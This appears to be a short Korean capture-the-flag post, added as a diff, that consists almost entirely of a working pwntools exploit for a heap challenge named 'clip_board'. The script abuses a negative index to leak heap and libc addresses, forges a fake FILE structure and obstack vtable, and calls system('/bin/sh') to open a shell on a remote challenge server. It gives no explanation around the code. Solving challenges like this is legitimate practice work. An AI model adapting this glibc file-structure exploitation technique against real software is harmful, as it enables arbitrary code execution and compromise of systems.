@@ -1,0 +1,74 @@
+pwn1 슬쩍 올려봅니다
+```python
+from pwn import *
+elf = ELF('./clip_board')
+if sys.argv[1] == '0':
+    r = remote('43.201.64.101', 8888)
+    libc = ELF('./libc.so.6')
+else:
+    r = process('./clip_board')
+    libc = elf.libc
+
+def AddClipBoard(idx, size, contents):
+    r.sendlineafter('> ', '1')
+    r.sendlineafter('index > ', str(idx))
+    r.sendlineafter('size > ', str(size))
+    r.sendlineafter('contents > ', contents)
+
+def DelClipBoard(idx):
+    r.sendlineafter('> ', '2')
+    r.sendlineafter('index > ', str(idx))
+
+def ViewClipBoard(idx):
+    r.sendlineafter('> ', '3')
+    r.sendlineafter('index > ', str(idx))
+
+def HeapLeak():
+    r.recvuntil('heap leak: ')
+    return int(r.recv(14), 16)
+
+heap_base = HeapLeak() - 0x2a0
+r.success(f'heap_base : {hex(heap_base)}')
+
+for i in range(1,10):
+    AddClipBoard(i, 0x100, b'a'*0x30)
+DelClipBoard(2)
+DelClipBoard(3)
+ViewClipBoard(-4)
+r.recv(8)
+libc_base = u64(r.recv(6) + b'\x00\x00') - 131 - libc.symbols['_IO_2_1_stdout_']
+_IO_obstack_jumps = libc_base + 0x2163c0
+_IO_obstack_overflow = _IO_obstack_jumps + 0x18
+fake_IO_obstack_overflow_vtable = _IO_obstack_overflow - 0x38
+
+r.success(hex(libc_base))
+r.success(hex(_IO_obstack_jumps))
+
+fake_IO = b''
+fake_IO += p64(0xfbad1800)
+fake_IO += p64(heap_base + 0x30) * 13
+fake_IO += p64(0x1)
+fake_IO += p32(0x0) * 2
+fake_IO += p64(0x0) * 1
+fake_IO += p64(heap_base + 0x30)
+fake_IO += p64(0x0) * 9
+fake_IO += p64(fake_IO_obstack_overflow_vtable)
+fake_IO += p64(heap_base + 0xa40)
+system = libc_base + libc.symbols['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+fake_obstack = b''
+fake_obstack += p64(0x0) * 7
+fake_obstack += p64(system)
+fake_obstack += p64(0x0)
+fake_obstack += p64(binsh)
+fake_obstack += p64(0x1)
+
+for i in range(4, 10):
+    DelClipBoard(i)
+DelClipBoard(1)
+assert len(fake_IO) <= 256
+AddClipBoard(4, 0x100, fake_obstack)
+AddClipBoard(-4, 0x100, fake_IO)
+
+r.interactive()
+```
